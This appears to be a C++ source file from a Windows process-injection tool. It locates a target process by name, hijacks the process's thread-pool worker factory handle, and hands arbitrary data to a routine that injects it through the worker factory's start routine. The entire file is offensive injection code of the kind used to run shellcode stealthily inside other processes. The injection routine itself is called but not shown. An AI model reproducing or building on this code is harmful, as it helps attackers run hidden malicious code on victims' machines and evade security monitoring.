#include "Process.h"

bool Process::ProcessWorkerFactoryInject(unsigned char* data, size_t dataSize) {

	if (!isInitialized || hijackType != TpWorkerFactory) {
		std::cerr << "{!!} Invalid sub-argument passed!" << std::endl;
		return false;
	}

	return InjectViaWorkerFactoryStartRoutine(processHandle, handleToHijack, data, dataSize);
}


bool Process::init() {

	//
	// Find Target process
	//

	processHandle = enumerateProcess(name, &PID);
	if (processHandle == INVALID_HANDLE_VALUE) {

		std::wcerr << L"{!!} Failed to get handle to process: " << name << std::endl;
		return false;
	}


	//
	// Hijack Handle
	//

	switch (this->hijackType) {

	case TpWorkerFactory:
		handleToHijack = hijackProcessWorkerFactory(processHandle);
		break;

	default:
		return false;
	}

	if (handleToHijack == INVALID_HANDLE_VALUE) {

		std::cerr << "{!!} Failed to hijack process handle needed." << std::endl;
		return false;
	}



	std::cout << "{+} Initialization Successful." << std::endl;
	return (isInitialized = true);
}


Process::~Process() {

	if (handleToHijack) {
		CloseHandle(handleToHijack);
	}

	if (processHandle) {
		CloseHandle(processHandle);
	}
}